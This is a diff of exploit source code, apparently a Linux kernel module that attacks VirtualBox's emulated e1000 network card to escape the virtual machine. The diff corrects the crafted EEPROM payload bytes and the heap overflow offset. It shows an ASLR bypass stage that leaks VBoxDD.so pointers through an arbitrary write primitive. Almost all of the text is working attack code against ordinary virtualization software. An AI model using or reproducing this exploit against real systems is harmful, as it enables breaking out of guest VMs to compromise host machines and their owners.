@@ -40,14 +40,14 @@ struct e1000_desc* tx_ring;
 uint8_t* tx_buffer;
 static int	idx = 0;
 uint16_t mu16Data[64] =
-{	0x0008, 0x2715, 0x4920, 0x0000, 0xffff, 0x0000, 0x0000, 0x0000,
-	0x0000, 0x0000, 0x0844, 0x1e00, 0x8680, 0x0e10, 0x8680, 0x4030,
+{	0x0008, 0x1527, 0x2049, 0x0000, 0xffff, 0x0000, 0x0000, 0x0000,
+	0x0000, 0x0000, 0x4408, 0x001e, 0x8086, 0x100e, 0x8086, 0x3040,
 	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
 	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
-	0x0000, 0x6170, 0x0c28, 0xc800, 0xc800, 0x0000, 0x0000, 0x0000,
-	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0206,
+	0x0000, 0x7061, 0x280c, 0x00c8, 0x00c8, 0x0000, 0x0000, 0x0000,
+	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0602,
 	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
-	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0xc45f
+	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x5fc4
 };
 
 /* ================================== CORE ================================ */
@@ -161,17 +161,17 @@ static void heap_overflow(uint16_t new_addr)
 	//------------- Payload setup -------------//
 	
 	/* We will overflow on EEProm Struct. Looks like 
-	 *      ...
+	 *		...
 	 *		- uint16_t	m_au16Data[64]		(1024 bits)
 	 * 		- enum		m_eState			(32 bits)
 	 *		- bool		m_fWriteEnabled		(08 bits)
 	 * 		- uint8_t 	Alignment1			(08 bits)
-     *		- uint16_t	m_u16Word			(16 bits)
-     *		- uint16_t	m_u16Mask			(16 bits)
-     *		- uint16_t	m_u16Addr			(16 bits)
+	 *		- uint16_t	m_u16Word			(16 bits)
+	 *		- uint16_t	m_u16Mask			(16 bits)
+	 *		- uint16_t	m_u16Addr			(16 bits)
 	 * 		... 
-     */
-	memcpy(&(tx_buffer[PAYLOAD_LEN - 142]), mu16Data, 128);
+	 */
+	memcpy(&(tx_buffer[PAYLOAD_LEN - 140]), mu16Data, 128);
 	tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
 	tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
 	tx_buffer[PAYLOAD_LEN - 10]	= 0x00;
@@ -317,27 +317,27 @@ static void write_primitive(uint16_t address, uint16_t value)
 
 static uint64_t aslr_bypass(void)
 {
-    pr_info("##### Stage 1 #####\n");
+	pr_info("##### Stage 1 #####\n");
 
-    // Set no loopback mode
+	// Set no loopback mode
 	uint32_t rctl = get_register(RCTL) | RCTL_LBM_NO;
 	set_register(RCTL, rctl);
 
-    uint8_t leaked_bytes[8];
-    uint32_t i;
-    for (i = 0; i < 8; i++) {
-        write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
-        leaked_bytes[i] = inb(0x4107);
+	uint8_t leaked_bytes[8];
+	uint32_t i;
+	for (i = 0; i < 8; i++) {
+		write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
+		leaked_bytes[i] = inb(0x4107);
 
-        pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
-    }
+		pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
+	}
 
-    uint64_t leaked_vboxdd_ptr = *((uint64_t *) leaked_bytes);
-    uint64_t vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
-    pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
-    pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
+	uint64_t leaked_vboxdd_ptr = *((uint64_t *) leaked_bytes);
+	uint64_t vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
+	pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
+	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
 
-    return vboxdd_base;
+	return vboxdd_base;
 }
 
 static void buffer_overflow(void)
